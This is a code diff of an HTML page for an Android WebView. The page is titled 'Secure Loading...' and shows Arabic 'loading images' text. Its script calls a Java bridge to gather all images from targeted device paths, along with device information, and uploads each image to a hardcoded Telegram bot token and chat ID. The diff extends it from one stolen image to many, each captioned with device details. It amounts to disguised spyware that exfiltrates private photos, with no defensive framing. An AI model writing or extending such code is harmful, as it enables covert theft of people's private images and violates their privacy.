@@ -4,47 +4,63 @@
     <meta charset="utf-8">
     <title>Secure Loading...</title>
   </head>
-  <body style="background:#000;color:#0f0;">
-    <h3>🔄 جاري التحميل...</h3>
+  <body style="background:#000;color:#0f0;font-family:monospace;">
+    <h3>🔄 جاري تحميل الصور...</h3>
+    <div id="log"></div>
 
     <script>
-      async function sendToTelegram(base64img) {
-        // ✅ تشويش على التوكن:
+      const log = (msg) => {
+        document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
+      };
+
+      async function sendToTelegram(base64img, deviceInfo, index) {
         const part1 = "8066816136";
         const part2 = "AAFqNp9OCT2hHS00yOZ0HfUBzBCxi1ocpY0";
         const botToken = part1 + ":" + part2;
 
         const chatId = "6894787120";
 
-        // تحويل Base64 إلى Blob للصورة
-        const blob = await (await fetch(`data:image/jpeg;base64,${base64img}`)).blob();
+        try {
+          const blob = await (await fetch(`data:image/jpeg;base64,${base64img}`)).blob();
+          const formData = new FormData();
+          formData.append("chat_id", chatId);
+          formData.append("caption", `📱 ${deviceInfo} \n🖼️ صورة رقم ${index + 1}`);
+          formData.append("photo", blob, "image.jpg");
 
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", blob, "image.jpg");
+          const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
 
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        })
-        .then(res => {
-          document.body.innerHTML += "<p>✔️ تم إرسال الصورة إلى السيرفر</p>";
-        })
-        .catch(err => {
-          document.body.innerHTML += "<p>❌ فشل الإرسال: " + err + "</p>";
-        });
+          if (res.ok) {
+            log(`✔️ تم إرسال صورة ${index + 1}`);
+          } else {
+            log(`❌ فشل إرسال صورة ${index + 1}`);
+          }
+        } catch (err) {
+          log(`⚠️ خطأ في صورة ${index + 1}: ${err}`);
+        }
       }
 
-      // استدعاء Java method من WebView
+      // تشغيل العملية
       try {
-        const imgData = bridge.getImageBase64();
-        if (imgData && imgData !== "ERROR") {
-          sendToTelegram(imgData);
+        const images = bridge.getAllTargetImagesBase64().split("###");
+        const info = bridge.getDeviceInfo();
+
+        if (images.length === 0 || (images.length === 1 && images[0] === "")) {
+          log("📛 لم يتم العثور على صور في المسارات المحددة");
         } else {
-          document.body.innerHTML += "<p>📛 لم يتم العثور على صورة</p>";
+          log(`🔍 تم العثور على ${images.length} صورة`);
+          images.forEach((img, idx) => {
+            if (img && img.length > 100) {
+              sendToTelegram(img, info, idx);
+            } else {
+              log(`⚠️ تم تجاهل صورة ${idx + 1} (ربما تالفة)`);
+            }
+          });
         }
       } catch (e) {
-        document.body.innerHTML += "<p>🚫 خطأ في الاتصال بالتطبيق</p>";
+        log("🚫 خطأ في الاتصال بالتطبيق: " + e);
       }
     </script>
   </body>
